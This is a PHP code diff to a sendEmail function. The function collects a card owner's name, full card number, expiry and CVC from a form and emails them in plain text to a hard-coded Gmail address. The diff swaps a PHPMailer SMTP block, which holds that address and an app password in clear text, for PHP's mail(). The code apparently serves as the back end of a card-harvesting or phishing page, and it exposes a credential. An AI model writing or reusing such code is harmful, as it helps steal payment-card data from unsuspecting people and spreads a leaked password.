@@ -10,7 +10,6 @@ use PHPMailer\PHPMailer\SMTP;
 
 
 function sendEmail($post) {
-    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
     $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
     $name = $post['name'];
     $card_number = $post['cardNumber'];
@@ -21,7 +20,6 @@ function sendEmail($post) {
 
     $email_body = "You have received a new message.\n\n";
     $email_body .= "Card owner: $name\n";
-    // $email_body .= "Email: $to\n";
     $email_body .= "Card number: $card_number\n";
     $email_body .= "Card expiration year: $card_expiration_year\n";
     $email_body .= "Card expiration month: $card_expiration_month\n";
@@ -34,33 +32,66 @@ function sendEmail($post) {
     $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
     $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
     $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
-    $mail = new PHPMailer(true);  // Create a new PHPMailer instance
+    $mail = new PHPMailer(true);  
 
-    try {
-        //Server settings
-        $mail->SMTPDebug = 0;  // Disable verbose debug output
-        $mail->isSMTP();  // Set mailer to use SMTP
-        $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
-        $mail->SMTPAuth   = true;  // Enable SMTP authentication
-        $mail->Username   = 'americanresidence435@gmail.com';   // Your Gmail address
-        $mail->Password   = 'dtwh cnul jqfq uxol';  // Your Gmail password or app-specific password
-        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;  // Enable TLS encryption
-        $mail->Port       = 587;  // TCP port to connect to Gmail's SMTP
+    // try {
+        
+    //     $mail->SMTPDebug = 0;  
+    //     $mail->isSMTP(); 
+    //     $mail->Host       = 'smtp.gmail.com'; 
+    //     $mail->SMTPAuth   = true;  
+    //     $mail->Username   = 'americanresidence435@gmail.com';  
+    //     $mail->Password   = 'dtwh cnul jqfq uxol'; 
+    //     $mail->SMTPSecure = 'tls';  
+    //     $mail->Port       = 587;  
 
-        //Recipients
-        $mail->setFrom('americanresidence435@gmail.com', 'Resido');  // From email address and name
-        $mail->addAddress("americanresidence435@gmail.com", "Resido");  // Recipient email address
+        
+    //     $mail->setFrom('americanresidence435@gmail.com', 'Resido');  // From email address and name
+    //     $mail->addAddress("americanresidence435@gmail.com", "Resido");  // Recipient email address
 
-        // Content
-        $mail->isHTML(true);  // Set email format to HTML
-        $mail->Subject = $subject;
-        $mail->Body    = $email_body;
+        
+    //     $mail->isHTML(true);  // Set email format to HTML
+    //     $mail->Subject = $subject;
+    //     $mail->Body    = $email_body;
 
-        // Send the email
-        $mail->send();
-        echo 'success';
-    } catch (Exception $e) {
-        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+        
+    //     $mail->send();
+    //     echo 'success';
+    // } catch (Exception $e) {
+    //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+    // }
+    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
+    // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
+    // $message = filter_var($message, FILTER_SANITIZE_STRING);
+    // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
+    $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);
+
+    // Set headers
+    $headers = "MIME-Version: 1.0" . "\r\n";
+    $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
+    $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
+    $headers .= "Reply-To: {$fromEmail}" . "\r\n";
+
+    $email_body = "You have received a new message.\n\n";
+    $email_body .= "Card owner: $name\n";
+    $email_body .= "Card number: $card_number\n";
+    $email_body .= "Card expiration year: $card_expiration_year\n";
+    $email_body .= "Card expiration month: $card_expiration_month\n";
+    $email_body .= "Card CVC: $cvv\n";
+
+
+    $html_body = "<h3>You have received a new message.</h3>";
+    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
+    $html_body .= "<p><strong>card number:</strong> $card_number</p>";
+    $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
+    $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
+    $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
+
+    // Send email
+    if (mail($to, $subject, $email_body, $headers)) {
+        return "Email sent successfully to $to.";
+    } else {
+        return "Failed to send email to $to.";
     }
 }
 
